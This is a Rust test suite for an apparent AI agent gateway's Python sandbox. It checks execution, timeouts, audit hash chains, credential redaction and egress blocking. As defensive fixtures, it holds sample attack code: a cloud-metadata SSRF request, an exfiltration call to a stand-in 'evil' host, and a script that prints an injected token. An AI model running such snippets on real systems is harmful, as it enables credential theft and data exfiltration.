// SPDX-License-Identifier: MIT

use std::sync::Arc;
use serde_json::json;

use aegis_gateway::audit::HashChainSequencer;
use aegis_gateway::core::audit::AuditChainVerifier;
use aegis_gateway::core::error::AegisResult;
use aegis_gateway::core::sandbox::{
    CodeSandboxEngine, ExecutionLanguage, SandboxExecutionRequest,
};
use aegis_gateway::core::transport::WireProtocolHandler;
use aegis_gateway::policy::secrets::VaultSecretStore;
use aegis_gateway::sandbox::{
    EgressFilterEngine, HermeticProcessSandbox, VaultCredentialBroker,
};
use aegis_gateway::transport::protocol::McpProtocolHandler;
use aegis_gateway::AegisGateway;

fn build_test_sandbox(secret_store: Arc<VaultSecretStore>) -> (Arc<HermeticProcessSandbox>, Arc<HashChainSequencer>) {
    let egress = Arc::new(EgressFilterEngine::new());
    let broker = Arc::new(VaultCredentialBroker::new(secret_store));
    let audit = Arc::new(HashChainSequencer::new());
    let sandbox = Arc::new(HermeticProcessSandbox::new(egress, broker, audit.clone()));
    (sandbox, audit)
}

#[tokio::test]
async fn test_phase16_golden_python_execution() -> AegisResult<()> {
    let secret_store = Arc::new(VaultSecretStore::new("vault://local"));
    let (sandbox, audit) = build_test_sandbox(secret_store);

    let req = SandboxExecutionRequest {
        language: ExecutionLanguage::Python,
        code: "import json\ndata = {'sum': 40 + 2, 'platform': 'aegis'}\nprint(json.dumps(data))".to_string(),
        timeout_secs: Some(5),
        services: vec![],
        env_vars: std::collections::HashMap::new(),
        tenant_id: None,
        caller_id: Some("test-agent".to_string()),
    };

    let result = sandbox.execute(&req).await?;
    assert!(result.success);
    assert_eq!(result.exit_code, 0);
    assert!(result.stdout.contains("\"sum\": 42"));
    assert!(result.stdout.contains("\"platform\": \"aegis\""));
    assert!(!result.code_hash_sha256.is_empty());
    assert!(result.attestation.is_some());

    let chain = audit.get_chain().await;
    assert!(!chain.is_empty());
    assert_eq!(chain[0].event.payload_hash_sha256, result.code_hash_sha256);
    assert!(audit.verify_chain(&chain).unwrap());
    Ok(())
}

#[tokio::test]
async fn test_phase16_ssrf_metadata_rejection() {
    let secret_store = Arc::new(VaultSecretStore::new("vault://local"));
    let (sandbox, audit) = build_test_sandbox(secret_store);

    let evil_code = "import urllib.request\nresp = urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')\nprint(resp.read())";
    let req = SandboxExecutionRequest {
        language: ExecutionLanguage::Python,
        code: evil_code.to_string(),
        timeout_secs: Some(5),
        services: vec![],
        env_vars: std::collections::HashMap::new(),
        tenant_id: None,
        caller_id: Some("malicious-actor".to_string()),
    };

    let res = sandbox.execute(&req).await;
    assert!(res.is_err(), "Cloud metadata SSRF must be blocked pre-execution");
    let err_msg = res.err().unwrap().to_string();
    assert!(err_msg.contains("SSRF violation") || err_msg.contains("cloud metadata"));

    let chain = audit.get_chain().await;
    assert!(!chain.is_empty());
    let last = &chain[chain.len() - 1];
    assert_eq!(last.event.target_resource, "sandbox:egress_firewall");
    assert!(audit.verify_chain(&chain).unwrap());
}

#[tokio::test]
async fn test_phase16_egress_unauthorized_domain_rejection() {
    let secret_store = Arc::new(VaultSecretStore::new("vault://local"));
    let (sandbox, _) = build_test_sandbox(secret_store);

    let exfil_code = "import urllib.request\nurllib.request.urlopen('https://evil-unauthorized-server.com/steal?data=all')";
    let req = SandboxExecutionRequest {
        language: ExecutionLanguage::Python,
        code: exfil_code.to_string(),
        timeout_secs: Some(5),
        services: vec![],
        env_vars: std::collections::HashMap::new(),
        tenant_id: None,
        caller_id: None,
    };

    let res = sandbox.execute(&req).await;
    assert!(res.is_err(), "Untrusted external domain must be blocked by default-deny egress");
    let err_msg = res.err().unwrap().to_string();
    assert!(err_msg.contains("not in allowed domain whitelist"));
}

#[tokio::test]
async fn test_phase16_zero_knowledge_credential_injection_and_redaction() -> AegisResult<()> {
    let raw_secret = "ya29.sample_oauth_token_enterprise_secret_99887766";
    let secret_json = json!({
        "access_token": raw_secret,
        "token": raw_secret,
        "client_id": "test-client-id",
        "client_secret": "super-secret-client-key-12345",
        "refresh_token": "1//sample-refresh-token-9988"
    }).to_string();

    let secret_store = Arc::new(
        VaultSecretStore::new("vault://local")
            .with_seed_secret("AINA_GDRIVE_TOKEN_JSON", secret_json)
    );
    let (sandbox, _) = build_test_sandbox(secret_store);

    // Code attempts to print environment variables
    let leak_code = r#"
import os
token = os.environ.get("GOOGLE_ACCESS_TOKEN", "NOT_FOUND")
print("Found Token:", token)
"#;

    let req = SandboxExecutionRequest {
        language: ExecutionLanguage::Python,
        code: leak_code.to_string(),
        timeout_secs: Some(5),
        services: vec!["google".to_string()],
        env_vars: std::collections::HashMap::new(),
        tenant_id: None,
        caller_id: Some("agent-analyst".to_string()),
    };

    let result = sandbox.execute(&req).await?;
    assert!(result.success);
    assert_eq!(result.exit_code, 0);
    // Secret was injected
    assert!(result.credentials_injected.contains(&"GOOGLE_ACCESS_TOKEN".to_string()));
    // But stdout was strictly scrubbed!
    assert!(!result.stdout.contains(raw_secret), "Raw secret token MUST NOT appear in output");
    assert!(result.stdout.contains("[REDACTED_CREDENTIAL]"), "Secret must be masked to [REDACTED_CREDENTIAL]");

    Ok(())
}

#[tokio::test]
async fn test_phase16_execution_timeout_containment() -> AegisResult<()> {
    let secret_store = Arc::new(VaultSecretStore::new("vault://local"));
    let (sandbox, _) = build_test_sandbox(secret_store);

    let sleep_code = "import time\ntime.sleep(10)\nprint('Done')";
    let req = SandboxExecutionRequest {
        language: ExecutionLanguage::Python,
        code: sleep_code.to_string(),
        timeout_secs: Some(1),
        services: vec![],
        env_vars: std::collections::HashMap::new(),
        tenant_id: None,
        caller_id: None,
    };

    let result = sandbox.execute(&req).await?;
    assert!(!result.success);
    assert_eq!(result.exit_code, -1);
    assert!(result.stderr.contains("timed out after 1s"));
    Ok(())
}

#[tokio::test]
async fn test_phase16_wire_protocol_execute_code() -> AegisResult<()> {
    let gateway = Arc::new(AegisGateway::default());
    let handler = McpProtocolHandler::new(gateway);

    let wire_req = json!({
        "jsonrpc": "2.0",
        "id": "wire-exec-1",
        "method": "tools/call",
        "params": {
            "name": "execute_code",
            "arguments": {
                "language": "python",
                "code": "print('Wire execution OK: ' + str(21 * 2))"
            }
        }
    });

    let raw_resp = handler.handle_message(&wire_req.to_string()).await?.unwrap();
    let resp_val: serde_json::Value = serde_json::from_str(&raw_resp)?;

    assert_eq!(resp_val["jsonrpc"], "2.0");
    assert_eq!(resp_val["id"], "wire-exec-1");
    let content_text = resp_val["result"]["content"][0]["text"].as_str().unwrap();
    assert!(content_text.contains("Wire execution OK: 42"));
    assert_eq!(resp_val["result"]["isError"], false);
    Ok(())
}
